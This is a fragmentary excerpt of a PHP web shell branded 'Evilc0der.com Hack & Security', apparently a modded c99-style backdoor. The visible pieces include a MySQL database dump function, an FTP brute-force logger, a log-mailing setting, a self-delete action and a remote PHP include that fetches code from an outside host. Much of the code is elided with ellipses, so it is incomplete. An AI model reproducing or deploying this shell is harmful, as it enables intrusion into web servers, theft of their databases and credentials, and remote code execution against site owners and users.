...
$shver = "Evilc0der.com Hack & Security"; //Current version
...
$donated_html = "<center><b>Owned by Evilc0der.com</b></center>";
...
$log_email = "loglayan pictir"; //Default e-mail for sending logs
...
function mysql_dump($set)
{
 ...
 $out = "# Dumped by  ".$shver."
# Home page: http://www.evilc0der.com
#
# Host settings:
...
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta http-equiv="Content-Language" content="en-us"><title><?php echo getenv("HTTP_HOST"); ?> - Evilc0der.com</title><STYLE>
...
<? include("http://$qchax1$qchar1$qchar2$qchar3$qchar4"); ?>
<?php
$d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
  ...
  if (!empty($submit))
  {
   ...
   else
   {
    if ($fqb_logging)
    {
     ...
     $fqb_log = "FTP Quick Brute (called  ".$shver.") started at ".date("d.m.Y H:i:s")."\r\n\r\n";
...
if ($act == "selfremove")
{
 ...
 {
  if (unlink(__FILE__)) {@ob_clean(); echo "Thanks for using ".$shver."!"; k1r4exit(); }
...
<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#000000 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[  <?php echo $shver; ?> <a href="<?php echo $surl; ?>act=about"><u><b>Modded by</b></u></a> Ekin0x@hotmail.com | <a href="http://www.evilc0der.com"><font color="#FF0000">Hack Haber</font></a><font color="#FF0000"></font> | Generation time: <?php echo round(getmicrotime()-starttime,4); ?> ]--</b></p></td></tr></table>
